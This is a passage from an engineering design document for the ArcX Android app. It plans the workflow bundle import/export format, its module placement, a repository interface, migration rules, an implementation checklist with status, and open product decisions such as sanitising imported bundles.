  at all** (`MainActivity.kt:26-59`). It needs `intent` handling in `onCreate` *and* `override fun
  onNewIntent`, since a singleTask instance already in the back stack receives the file there.
- Route the `Uri` to Discover. `ArcxNavHost` already has a `DISCOVER` route (`ArcxNavHost.kt:70`,
  `:184`); the smallest version hands the Uri to `DiscoverRoute` (a nav argument or a shared state
  holder) and opens the review sheet from §4.4.
- Settle the filename on **`.arcx.json`** — a double extension keeps it a valid, previewable `.json`
  while being recognisable. Changing `EXPORT_FILE_NAME` (`DiscoverViewModel.kt:27`) is a one-line
  change with nothing depending on the old value.

---

## 6. The canonical shape

### 6.1 Where the format lives — and a stability caveat worth respecting

`CLAUDE.md` describes `:core:model` as "Pure Kotlin contracts. No Android imports." `Workflow` is
already there, already `@Serializable` (`Workflow.kt:9`), and the module already applies the
serialization plugin (`core/model/build.gradle.kts`). So the format belongs there.

**But not all of it.** `compose-stability.conf` declares `com.arcx.core.model.*` stable by package
wildcard, and its own comment (`compose-stability.conf:10-13`) is emphatic: *"The declaration is
true, not a convenience: everything in `:core:model` is a data class of primitives, Strings and
enums… If that ever stops being true, this file is the thing that has to change first."* It is a
promise, not a hint.

Split accordingly:

- **`WorkflowSpec` → `:core:model`.** It genuinely needs the stability promise: `DiscoverUiState`
  holds three `List<WorkflowSpec>` fields (`DiscoverViewModel.kt:34`, `:50`, `:56`) and passes specs
  into composables (`DiscoverRoute.kt:238`, `:341`, `:346`). It is a data class of primitives,
  Strings and enums, so it satisfies the promise exactly as written.
- **`WorkflowBundle` + the `Json` config → `:core:data`, next to the repository.** The envelope is a
  wire concern that is never drawn, so putting it in `:core:model` would widen the stability promise
  (to a type holding a `List`) for no benefit. With the repository owning parse and serialise,
  `:feature:discover` never touches the envelope at all — it only ever handles `List<WorkflowSpec>`.
  That is what makes the split clean rather than arbitrary.

Every feature module already gets `:core:model` for free via `AndroidFeatureConventionPlugin`
(`build-logic/convention/src/main/kotlin/AndroidFeatureConventionPlugin.kt`,
`add("implementation", project(":core:model"))`), so `:feature:discover` needs no new dependency.
Its `build.gradle.kts` can drop `libs.kotlinx.serialization.json` once it no longer parses anything.

**Built as described.** The stability caveat held when checked rather than assumed: a Compose report
against the new tree returns `stable val selected: WorkflowSpec?`. `:feature:discover` dropped
kotlinx-serialization, and its `build.gradle.kts` carries a comment saying why it must stay dropped.

### 6.2 Who owns import and export

A `WorkflowBundleRepository`, interface in `:core:domain` alongside the other four
(`Repositories.kt`), implementation in `:core:data`.

`:core:domain` is an Android library (`core/domain/build.gradle.kts` applies
`arcx.android.library`) and already imports Android types in a port — `SystemSurfaces.kt:3` imports
`android.content.Intent` — so `android.net.Uri` in the interface is consistent with the existing
precedent.

```
interface WorkflowBundleRepository {
    /** Parse + sanitise. Writes nothing — this is what the review sheet reads. */
    suspend fun read(uri: Uri): BundleRead        // specs + warnings + version notice
    suspend fun install(specs: List<WorkflowSpec>): Int
    suspend fun write(uri: Uri, specs: List<WorkflowSpec>)
    /** Cache file + FileProvider Uri, for the share sheet. */
    suspend fun shareable(specs: List<WorkflowSpec>, name: String): Uri
}
```

Two things this buys:

- **`read` and `install` become separate calls.** Today they are one expression
  (`DiscoverViewModel.kt:192`), which is precisely why there is nowhere to put a confirmation.
  Splitting them is what makes §4.4 possible.
- **`DiscoverViewModel` stops injecting `Context`** (`:88`) and stops doing its own
  `contentResolver` IO (`:178`, `:209`). It is currently the only ViewModel in the repo that does
  either.

Sanitisation (the §4.5 table) lives in the impl, once, applied on every path in.

**Built, with four differences from the sketch above**, all of them because the parts that needed
items 3–5 were left for items 3–5:

- `read` returns `List<WorkflowSpec>`, not a `BundleRead`. There are no warnings or version notice
  to carry yet — those are items 3 and 4 — so the richer return type would have been an empty box.
- `install` returns `List<Workflow>` rather than `Int`, because the caller that installs exactly one
  gallery entry wants to open it in the editor.
- `write` takes `List<Workflow>`, not `List<WorkflowSpec>`, which keeps `Workflow → WorkflowSpec` —
  where the export strips `providerId` and `isBuiltIn` — inside the module that owns the format.
- No `shareable()`. It belongs with the `FileProvider` in item 5 and nothing calls it before then.

The two things it was for both landed: `read` and `install` are separate calls with nothing between
them yet — the gap exists so the review sheet has somewhere to go — and `DiscoverViewModel` no longer
injects `Context` or touches `contentResolver`.

### 6.3 Migration path that does not break the two asset files

The two bundled assets are the binding constraint. Rules:

1. **Keep all 15 field names and every default except `icon`**, which becomes
   `DEFAULT_WORKFLOW_ICON` — `:core:data`'s value. Verified safe: *every* entry in both assets
   (16 + 12) sets `icon` explicitly, so the default is never exercised by either file. There is now
   a test for that (`WorkflowBundleTest.every shipped workflow names an icon`).
2. **`"version": 1` stays valid** whether or not the reader checks it.
3. **`kind` must be optional on read.** Write it on export; accept its absence. Otherwise both
   assets and every file exported by the current build stop importing.
4. **Keep two mapper functions, and name the difference.** They have genuinely different jobs:
   - `StarterWorkflows.kt:45` keeps `isBuiltIn`/`isPinned`/`isFavorite` and takes an explicit id —
     this is how "Rewrite Professionally" arrives pinned and read-only.
   - `WorkflowBundle.kt:55` must strip them.

   Name them `toWorkflowAsStarter(now, id)` and `toWorkflowAsImport()` so the distinction lives in
   the name and cannot be collapsed by a future tidy-up. A single `toWorkflow` is exactly the
   refactor that would reopen §2.5's `isBuiltIn` hole.
5. `readStarterWorkflows(context)` stays in `:core:data` — it needs `Context` — and is the model for
   a `readGallery(context)` that replaces `DiscoverViewModel.kt:107-122`.
6. The format had **zero tests** before item 0. `core/data/src/test/kotlin/.../bundle/WorkflowBundleTest.kt`
   is now the place to extend as the format changes.

---

## 7. Implementation checklist

Effort is one engineer, hands-on, excluding review.

| # | Step | Effort | Status |
|---|---|---|---|
| **0** | **`coerceInputValues = true` on both decoders** + corrected comments + first tests for the format | **30 min** | ✅ **Done.** The only item here that fixed a bug in today's build. |
| 1 | Move `WorkflowSpec` → `:core:model`; `WorkflowBundle` + `Json` → `:core:data`. Delete the discover copies. Single `icon` default. Rename the two mappers. | 1–2 h | ✅ **Done.** `toWorkflowAsStarter` / `toWorkflowAsImport`, named as opposites, with a test that fails if anyone collapses them. |
| 2 | `WorkflowBundleRepository` in `:core:domain` + impl in `:core:data`. Move `import`/`export`/gallery-read out of `DiscoverViewModel`; drop its `@ApplicationContext Context`. Add sanitisation (§4.5). | 2–3 h | ✅ **Done**, with the four interface differences in §6.2. Tests 79 → 89; the ten new ones assert what a bundle must *not* be able to do. |
| 3 | **Import review sheet.** Extend `GalleryDetailSheet` (`DiscoverRoute.kt:519`) with the capability sentence (from `input` **+** `PromptTemplate.variablesIn`), the output sentence, stripped-fields line, collisions, per-workflow checkboxes. | 3–4 h | The step that makes this feature safe. Do not ship 5–6 without it. |
| 4 | `kind` + `version` actually written (`encodeDefaults`), tolerant read, newer-version banner. | 2 h | Verify both assets still parse |
| 5 | FileProvider + `res/xml/file_paths.xml` + `shareable()` on `SystemSurfaces` + "Share" in the library row menu. Rename export to `.arcx.json`. | 3–4 h | |
| 6 | Receiving: `MainActivity` intent filters, `onCreate`/`onNewIntent` handling, route to Discover's review sheet. | 2–3 h | **Needs a real device.** File managers and chat apps disagree about mime types, and the feature is judged entirely on whether tapping the file in Files works. |

**Remaining: ~10–13 hours**, items 3–6. Step 3 is the safety-critical one left and is worth shipping
before 5–6 exist.

Sequencing note: 1 and 2 were pure refactors with no user-visible change. 3 is the gate. 5 and 6 are
the actual feature and are the least risky code in the list — which is why it is worth resisting the
urge to do them first.

---

## 8. Product decisions — for the owner, not the engineer

1. **Does `model` survive an import?** Strip it (safest, may lose a deliberate choice) / keep it
   (may fail with HTTP 404, or silently lose vision — §2.2) / show it as text and let the user apply
   it. *Recommendation: strip and show.*
2. **Does a shared bundle carry one workflow or the whole library?** Today only whole-library.
   Per-workflow share is the thing people will actually want; whole-library export stays as backup.
3. **Should `SCREENSHOT` / `SCREEN_TEXT` workflows be blocked on import, or merely warned?** Warning
   is consistent with the rest of ArcX's tone, but "reads your screen" is the strongest claim any
   workflow makes.
4. **Duplicate names.** Today two imports of one file give two rows, deliberately
   (`WorkflowBundle.kt:50-54`). Offer Replace / Keep both / Skip, or keep the current silent
   behaviour?
5. **Should the format gain a `description` (and `author`)?** Nothing in `Workflow` has one, so a
   shared workflow arrives with no explanation beyond its prompt — the weakest part of the sharing
   story. Adding `description` to `WorkflowSpec` but not to `Workflow` means it is shown at import
   and then discarded; adding it to both is a Room migration.
6. **Filename and extension:** `.arcx.json` / `.arcx` / plain `.json`. Affects how many mime filters
   step 6 needs.
7. **Does ArcX ever accept a bundle from a URL or a QR code?** Out of scope here, but it is where
   this road leads, and it changes the answer in §4.1 — a URL-sourced bundle has no human in the
   loop who chose the file.
